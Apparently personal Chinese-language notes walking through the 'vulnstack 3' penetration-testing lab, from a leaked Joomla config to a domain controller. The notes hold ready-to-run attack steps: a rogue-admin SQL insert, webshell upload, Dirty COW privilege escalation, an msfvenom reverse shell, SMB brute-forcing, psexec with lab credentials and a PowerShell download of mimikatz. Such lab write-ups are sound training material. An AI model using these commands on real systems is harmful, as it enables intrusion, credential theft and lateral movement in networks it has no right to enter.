# vlunstack 3



## 外网主机192.168.139.118

使用dirsearch扫描到配置文件"configuration.php~"

```php
<?php
class JConfig {
	public $offline = '0';
	public $offline_message = '网站正在维护。<br /> 请稍候访问。';
	public $display_offline_message = '1';
	public $offline_image = '';
	public $sitename = 'test';
	public $editor = 'tinymce';
	public $captcha = '0';
	public $list_limit = '20';
	public $access = '1';
	public $debug = '0';
	public $debug_lang = '0';
	public $debug_lang_const = '1';
	public $dbtype = 'mysqli';
	public $host = 'localhost';
	public $user = 'testuser';
	public $password = 'cvcvgjASD!@';
	public $db = 'joomla';
	public $dbprefix = 'am2zu_';
	public $live_site = '';
	public $secret = 'gXN9Wbpk7ef3A4Ys';
	public $gzip = '0';
	public $error_reporting = 'default';
	public $helpurl = 'https://help.joomla.org/proxy?keyref=Help{major}{minor}:{keyref}&lang={langcode}';
	public $ftp_host = '';
	public $ftp_port = '';
	public $ftp_user = '';
	public $ftp_pass = '';
	public $ftp_root = '';
	public $ftp_enable = '0';
	public $offset = 'UTC';
	public $mailonline = '1';
	public $mailer = 'mail';
	public $mailfrom = 'test@test.com';
	public $fromname = 'test';
	public $sendmail = '/usr/sbin/sendmail';
	public $smtpauth = '0';
	public $smtpuser = '';
	public $smtppass = '';
	public $smtphost = 'localhost';
	public $smtpsecure = 'none';
	public $smtpport = '25';
	public $caching = '0';
	public $cache_handler = 'file';
	public $cachetime = '15';
	public $cache_platformprefix = '0';
	public $MetaDesc = '';
	public $MetaKeys = '';
	public $MetaTitle = '1';
	public $MetaAuthor = '1';
	public $MetaVersion = '0';
	public $robots = '';
	public $sef = '1';
	public $sef_rewrite = '0';
	public $sef_suffix = '0';
	public $unicodeslugs = '0';
	public $feed_limit = '10';
	public $feed_email = 'none';
	public $log_path = '/var/www/html/administrator/logs';
	public $tmp_path = '/var/www/html/tmp';
	public $lifetime = '15';
	public $session_handler = 'database';
	public $shared_session = '0';
}
```

oomla默认后端编辑模板即可getshell,查看官网[如何恢复或重置管理员密码？ - Joomla! Documentation](https://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F/zh-cn)

可以通过添加账号密码的方式添加管理员账号 admin2 secret

```mysql
INSERT INTO `am2zu_users`
   (`name`, `username`, `password`, `params`, `registerDate`, `lastvisitDate`, `lastResetTime`)
VALUES ('Administrator2', 'admin2',
    'd2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199', '', NOW(), NOW(), NOW());
INSERT INTO `am2zu_user_usergroup_map` (`user_id`,`group_id`)
VALUES (LAST_INSERT_ID(),'8');

```

![image-20240926005326219](W:\note\cyber_security\靶场\vulnhub\ai-web3\image-20240926005326219.png)

![image-20240926005401217](W:\note\cyber_security\靶场\vulnhub\ai-web3\image-20240926005401217.png)

![image-20240926005439866](W:\note\cyber_security\靶场\vulnhub\ai-web3\image-20240926005439866.png)

创建webshell文件

![image-20240926005500108](W:\note\cyber_security\靶场\vulnhub\ai-web3\image-20240926005500108.png)

连接后发现无法执行命令，换蚁剑使用绕过disable_functions插件

![image-20240926112759298](W:\note\cyber_security\靶场\hongri\vulnstack-3\image-20240926112759298.png)

成功连接

![image-20240926112853965](W:\note\cyber_security\靶场\hongri\vulnstack-3\image-20240926112853965.png)

信息收集

![image-20240926122315949](W:\note\cyber_security\靶场\hongri\vulnstack-3\image-20240926122315949.png)

发现存在双网卡192.168.93.120

同时发现系统显示为Ubuntu

发现一个泄露ssh的文件（顺的图，nnd我一直没有这个文件受不了了）

![image-20240927222613841](W:\note\cyber_security\靶场\hongri\vulnstack-3\image-20240927222613841.png)

wwwuser/wwwuser_123Aqx

![image-20240927222810672](W:\note\cyber_security\靶场\hongri\vulnstack-3\image-20240927222810672.png)

可以确定这台主机为centos，web服务应该是ubuntu启动的服务，通过nginx用centos进行转发

同时权限较低，根据信息收集的结果采用脏牛提取

上传dirty.c文件到centos上并编译

```shell
gcc -pthread dirty.c -o dirty -lcrypt
```

将编译后的可执行文件dirty移动到tmp目录下

```
mv dirty /tmp
```



![image-20240927225801609](W:\note\cyber_security\靶场\hongri\vulnstack-3\image-20240927225801609.png)

![image-20240927225903306](W:\note\cyber_security\靶场\hongri\vulnstack-3\image-20240927225903306.png)

上线msf方便后续内网渗透

```shell
msfvenom -p linux/64/meterpreter/reverse_tcp lhost=192.168.52.128 lport=9090 -f elf > msf.elf
```

```shell
msfconsole 
use exploit/multi/handler
set lhost 192.168.52.128
set lport 9090
set payload linux/x64/meterpreter/reverse_tcp
```

![image-20240927235906600](W:\note\cyber_security\靶场\hongri\vulnstack-3\image-20240927235906600.png)

进行内网探测

首先加路由，方便msf和192.168.93.100主机进行通信

```shell
run autoroute -s 192.168.93.0/24
```



```shell
background
#将shell挂起后台
use auxiliary/scanner/smb/smb_version
#使用smb辅助扫描模式
set rhost 192.168.93.0/24
#设置目标主机c段
run
```

![image-20240928001713862](W:\note\cyber_security\靶场\hongri\vulnstack-3\image-20240928001713862.png)

扫到三台主机

192.168.93.10，192.168.93.20，192.168.93.30

使用smb登录爆破模块

```shell
use auxiliary/scanner/smb/smb_login
```

没爆出来（用别人爆出来的结果）

```shell
use auxiliary/scanner/smb/smb_login
set user_file /root/Desktop/user.txt
set pass_file /root/Desktop/pass.txt
set rhosts 192.168.93.30
run
```

![image-20240928170754214](W:\note\cyber_security\靶场\hongri\vulnstack-3\image-20240928170754214.png)

使用下面psexec模块

```shell
use exploit/windows/smb/psexec 
set payload windows/meterpreter/bind_tcp
set rhost 192.168.93.30
set smbuser administrator
set smbpass 123qwe!ASD
```

至此获取第二个会话

![image-20240928172921419](W:\note\cyber_security\靶场\hongri\vulnstack-3\image-20240928172921419.png)

查看内网情况

![image-20240928173656300](W:\note\cyber_security\靶场\hongri\vulnstack-3\image-20240928173656300.png)

![image-20240928173709340](W:\note\cyber_security\靶场\hongri\vulnstack-3\image-20240928173709340.png)

发现域控主机位192.168.93.10



```
powershell (new-object Net.WebClient).DownloadFile('http://192.168.93.100:8888/kiwikatz.exe','C:\mimikatz.exe')
```



